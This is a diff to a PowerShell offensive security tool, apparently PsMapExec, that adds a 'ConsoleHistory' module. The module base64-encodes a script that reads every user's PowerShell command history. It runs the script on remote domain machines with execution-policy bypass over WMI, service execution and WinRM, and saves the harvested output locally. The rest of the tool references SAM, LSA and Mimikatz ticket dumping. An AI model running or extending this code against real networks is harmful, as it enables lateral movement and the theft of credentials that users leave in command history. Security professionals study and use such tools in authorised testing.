@@ -76,7 +76,7 @@ Write-Output $Banner
 Write-Host "Github  : "  -NoNewline
 Write-Host "https://github.com/The-Viper-One"
 Write-Host "Version : " -NoNewline
-Write-Host "0.1.4"
+Write-Host "0.1.5"
 Write-Host
 
 
@@ -188,6 +188,7 @@ $KerbDump = Join-Path $Tickets "KerbDump"
 $MimiTickets = Join-Path $Tickets "MimiTickets"
 $ekeys = Join-Path $PME "eKeys"
 $LSA = Join-Path $PME "LSA"
+$ConsoleHistory = Join-Path $PME "Console History"
 
   if (-not (Test-Path $PME)) {
     New-Item -ItemType Directory -Force -Path $PME  | Out-Null
@@ -247,6 +248,13 @@ $LSA = Join-Path $PME "LSA"
     Write-Host "[+] " -ForegroundColor "Green"   -NoNewline
     Write-Host "Created directory for MimiTickets at $MimiTickets"
 }
+
+  if (-not (Test-Path $ConsoleHistory)){
+    New-Item -ItemType Directory -Force -Path $ConsoleHistory  | Out-Null
+    Write-Host "[+] " -ForegroundColor "Green"   -NoNewline
+    Write-Host "Created directory for MimiTickets at $ConsoleHistory"
+}
+
 ######### Checks if user context is administrative when a session is spawned #########
 $CheckAdmin = "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"
 
@@ -600,6 +608,35 @@ elseif ($Module -eq "LogonPasswords"){
     }
 }
 
+elseif ($Module -eq "ConsoleHistory"){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "ConsoleHistory output will be written to $ConsoleHistory"
+    #""
+    if (!$ShowOutput){
+        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Use -ShowOutput to show results in the console"
+        ""
+    }
+}
+
+$ConsoleHostHistory = @'
+$usersFolderPath = "C:\Users"
+$users = Get-ChildItem -Path $usersFolderPath -Directory
+
+foreach ($User in $Users) {
+    $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+    if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
+        $historyContent = Get-Content -Path $historyFilePath -Raw
+        $historyLines = $historyContent -split "`n"
+        Write-output ""
+        Write-output "-----[$User]-----"
+        $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
+    }
+}
+'@
+
+
 ######### Module / Commands  #########
 
 # Tickets
@@ -665,6 +702,12 @@ $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicod
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
+# ConsoleHistory
+elseif ($Module -eq "ConsoleHistory"){
+$b64 = "$ConsoleHostHistory"
+$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
+$Command = "powershell.exe -ep bypass -enc $base64command"
+}
 
 elseif ($Module -eq "" -and $Option -eq "" -and $Command -ne ""){
 $base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
@@ -688,7 +731,7 @@ $WMIJobs = @()
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput)
+            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory)
             $Class = "PMEClass"
 
     $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
@@ -939,6 +982,11 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
              if ($ShowOutput){$result | Write-Host; Write-Host}
              $result | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"
              }
+
+             elseif ($Module -eq "ConsoleHistory"){
+             if ($ShowOutput){$result | Write-Host; Write-Host}
+             $result | Out-File -FilePath "$ConsoleHistory\$ComputerName-ConsoleHistory.txt" -Encoding "ASCII"
+             }
              
              elseif ($Commmand -ne ""){
              $result | Write-host
@@ -992,7 +1040,7 @@ elseif (!$osinfo){
             Start-Sleep -Milliseconds 500
         }
 
-        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput
+        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory
         [array]$WMIJobs += $WMIJob
 
         # Check if the maximum number of concurrent jobs has been reached
@@ -1049,7 +1097,7 @@ $ErrorActionPreference = "SilentlyContinue"
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput)
+            Param($Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory)
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
             $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
@@ -1319,6 +1367,11 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
              if ($ShowOutput){$a | Write-Host; Write-Host}
              $a | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"
              }
+
+             elseif ($Module -eq "ConsoleHistory"){
+             if ($ShowOutput){$a | Write-Host; Write-Host}
+             $a | Out-File -FilePath "$ConsoleHistory\$ComputerName-ConsoleHistory.txt" -Encoding "ASCII"
+             }
             }
                 
             }
@@ -1332,7 +1385,7 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
             Start-Sleep -Milliseconds 500
         }
 
-        $PsexecJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput
+        $PsexecJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory
         [array]$PSexecJobs += $PsexecJob
 
         # Check if the maximum number of concurrent jobs has been reached
@@ -1390,7 +1443,7 @@ $ErrorActionPreference = "SilentlyContinue"
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput)
+            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory)
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
             $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
@@ -1467,6 +1520,12 @@ $ErrorActionPreference = "SilentlyContinue"
                         if ($ShowOutput){$b | Write-host ; Write-Host}
                         $b | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"
                     }
+
+                    elseif ($Module -eq "ConsoleHistory") {
+                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
+                        if ($ShowOutput){$b | Write-host ; Write-Host}
+                        $b | Out-File -FilePath "$ConsoleHistory\$ComputerName-ConsoleHistory.txt" -Encoding "ASCII"
+                    }
                    
                     elseif ($Module -eq "Interactive") {
                         Start-Process powershell.exe -ArgumentList '-noexit -Command', "Enter-PSSession -ComputerName $ComputerName" -ErrorAction "Ignore"
@@ -1519,7 +1578,7 @@ $ErrorActionPreference = "SilentlyContinue"
             Start-Sleep -Milliseconds 500
         }
 
-        $WinRMJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput
+        $WinRMJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory
         [array]$WinRMJobs += $WinRMJob
 
         # Check if the maximum number of concurrent jobs has been reached
